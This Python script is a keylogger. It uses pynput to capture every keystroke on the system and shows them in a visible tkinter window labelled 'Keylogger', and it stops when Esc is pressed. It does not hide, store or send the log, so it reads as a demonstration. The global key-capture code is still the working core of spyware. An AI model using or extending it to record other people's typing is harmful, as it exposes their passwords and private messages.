import tkinter as tk
from pynput import keyboard
import threading

class Keylogger:
    def __init__(self, text_widget):
        self.log = ""
        self.text_widget = text_widget
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.tab:
                self.log += "\t"
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]
            elif key == keyboard.Key.esc:
                return False  # Stop the keylogger

        # Update the GUI (in a thread-safe way)
        self.text_widget.after(0, self.update_gui)

    def update_gui(self):
        self.text_widget.delete(1.0, tk.END)
        self.text_widget.insert(tk.END, self.log)

    def start(self):
        self.listener.start()

def run_gui():
    window = tk.Tk()
    window.title("Keylogger")
    window.geometry("400x300")
    window.resizable(False, False)

    label = tk.Label(window, text="Keylogger is running...")
    label.pack()

    text_box = tk.Text(window, wrap=tk.WORD)
    text_box.pack(expand=True, fill=tk.BOTH)

    keylogger = Keylogger(text_box)
    keylogger.start()

    window.mainloop()

if __name__ == "__main__":
    run_gui()
